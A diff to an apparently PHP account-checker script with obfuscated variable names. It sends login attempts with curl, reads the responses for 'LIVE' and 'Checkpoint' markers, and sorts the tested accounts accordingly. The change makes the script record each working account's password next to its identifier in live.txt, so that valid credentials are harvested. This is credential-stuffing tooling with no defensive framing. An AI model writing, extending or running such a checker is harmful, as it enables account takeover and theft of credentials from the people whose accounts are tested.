@@ -54,10 +54,11 @@ curl_setopt($k7, CURLINFO_HEADER_OUT, true);
     $z13 = "checkpoint";
     $s14 = curl_getinfo($k7, CURLINFO_HEADER_OUT);
     if(strpos($s14, $x11) !== false){
-echo "[$f2 LIVE $n1 ]  $m8 \n";
-     file_put_contents("live.txt", "$m8 \n");  }
+echo "[$f2 LIVE $n1 ]  $m8 Password: $b4 \n";
+     file_put_contents("live.txt", "$m8 | $b4 \n");  }
     if(strpos($s14, $j12) !== false){
-echo "[$f2 LIVE $n1 ] $m8 \n";file_put_contents("live.txt", "$m8 \n", FILE_APPEND);
+echo "[$f2 LIVE $n1 ] $m8 Password: $b4 \n";
+file_put_contents("live.txt", "$m8 | $b4 \n", FILE_APPEND);
 }
     if (strpos($s14,  $z13) !== false){
 echo "[$q0 Checkpoint $n1] $m8 \n";
